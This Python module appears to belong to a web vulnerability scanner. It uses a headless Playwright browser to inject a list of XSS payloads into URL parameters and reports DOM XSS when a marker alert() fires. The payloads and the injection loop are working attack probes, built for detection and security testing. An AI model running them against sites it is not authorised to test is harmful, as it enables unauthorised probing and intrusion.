"""
DOM XSS attack module.
Uses a singleton Playwright browser to detect client-side XSS in DOM sinks
(innerHTML, eval, document.write) that httpx-based scanners cannot reach.
"""
from __future__ import annotations
import asyncio
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs
from uuid import uuid4

from attacks.base import BaseAttack, SessionExpiredError
from rich.console import Console

console = Console(legacy_windows=False)

_MARKER = f"TWEB_{uuid4().hex[:8]}"

DOMXSS_PAYLOADS = [
    f"<img src=x onerror=alert('{_MARKER}')>",
    f"javascript:alert('{_MARKER}')",
    f"'><script>alert('{_MARKER}')</script>",
    f"\"><img src=x onerror=alert('{_MARKER}')>",
    f"';alert('{_MARKER}')//",
    f"\";alert('{_MARKER}')//",
    f"</script><script>alert('{_MARKER}')</script>",
    f"`-alert('{_MARKER}')-`",
]

_BROWSER_TIMEOUT_MS = 8_000
_WAIT_MS = 1_200


class DomXSSAttack(BaseAttack):
    name = "domxss"
    _seen_urls: set[str] = set()

    _playwright_inst = None
    _browser = None
    _sem = asyncio.Semaphore(3)

    @classmethod
    async def _get_browser(cls):
        if cls._browser is not None and not cls._browser.is_connected():
            # Browser process died — reset so we reinitialize
            if cls._playwright_inst:
                try:
                    await cls._playwright_inst.stop()
                except Exception:
                    pass
            cls._browser = None
            cls._playwright_inst = None
        if cls._browser is None:
            from playwright.async_api import async_playwright
            cls._playwright_inst = await async_playwright().start()
            cls._browser = await cls._playwright_inst.chromium.launch(headless=True)
        return cls._browser

    @classmethod
    async def cleanup(cls):
        if cls._browser:
            try:
                await cls._browser.close()
            except Exception:
                pass
        if cls._playwright_inst:
            try:
                await cls._playwright_inst.stop()
            except Exception:
                pass
        cls._browser = None
        cls._playwright_inst = None

    def _inject_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

    async def run(self, attack_point: dict, _payloads: list[str]) -> list[dict]:
        url = attack_point.get("url", "")
        param = attack_point.get("param")
        method = attack_point.get("method", "GET")

        if not param or method != "GET" or attack_point.get("is_header"):
            return []

        url_key = f"{url}|{param}"
        if url_key in DomXSSAttack._seen_urls:
            return []
        DomXSSAttack._seen_urls.add(url_key)

        console.print(f"  [cyan][DomXSS][/cyan] {url} ?{param}")

        all_findings: list[dict] = []

        # Semaphore acquire with timeout — prevents unbounded queue when asyncio.gather
        # fires dozens of run() calls; avoids waiting forever if browser crashes.
        try:
            await asyncio.wait_for(DomXSSAttack._sem.acquire(), timeout=20.0)
        except asyncio.TimeoutError:
            console.print(f"  [dim][DomXSS] Browser meşgul, {url}|{param} atlandı[/dim]")
            return []

        # Semaphore is now held — release in the outermost finally no matter what.
        try:
            browser = await DomXSSAttack._get_browser()
            context = await browser.new_context()

            try:
                # Inject session cookies into browser context
                try:
                    raw_cookies = list(self.session._client.cookies.jar)
                    hostname = urlparse(url).hostname or ""
                    pw_cookies = [
                        {
                            "name": c.name,
                            "value": c.value,
                            "domain": hostname,
                            "path": "/",
                        }
                        for c in raw_cookies
                        if c.name and c.value
                    ]
                    if pw_cookies:
                        await context.add_cookies(pw_cookies)
                except Exception:
                    pass

                page = await context.new_page()

                alert_fired = False

                async def _on_dialog(dialog):
                    nonlocal alert_fired
                    try:
                        msg = dialog.message or ""
                        if _MARKER in msg:
                            alert_fired = True
                        await dialog.dismiss()
                    except Exception:
                        pass

                page.on("dialog", _on_dialog)

                for payload in DOMXSS_PAYLOADS:
                    if self._should_stop():
                        break

                    alert_fired = False
                    injected = self._inject_url(url, param, payload)

                    try:
                        await page.goto(injected, timeout=_BROWSER_TIMEOUT_MS)
                        await page.wait_for_timeout(_WAIT_MS)
                    except Exception:
                        pass

                    if alert_fired:
                        console.print(
                            f"  [bold red][DomXSS][/bold red] alert() tetiklendi! "
                            f"payload={payload!r}"
                        )
                        all_findings.append({
                            "type": "domxss_execution",
                            "value": (
                                f"DOM XSS @ {url} ?{param}={payload!r} "
                                f"— alert({_MARKER!r}) fired"
                            ),
                            "confidence": 0.95,
                        })
                        break

                await page.close()

            except SessionExpiredError:
                raise
            except Exception as e:
                console.print(f"  [dim][DomXSS] Hata: {e}[/dim]")
            finally:
                try:
                    await context.close()
                except Exception:
                    pass

        except SessionExpiredError:
            raise
        except Exception as e:
            console.print(f"  [dim][DomXSS] Browser başlatılamadı: {e}[/dim]")
        finally:
            DomXSSAttack._sem.release()

        return all_findings
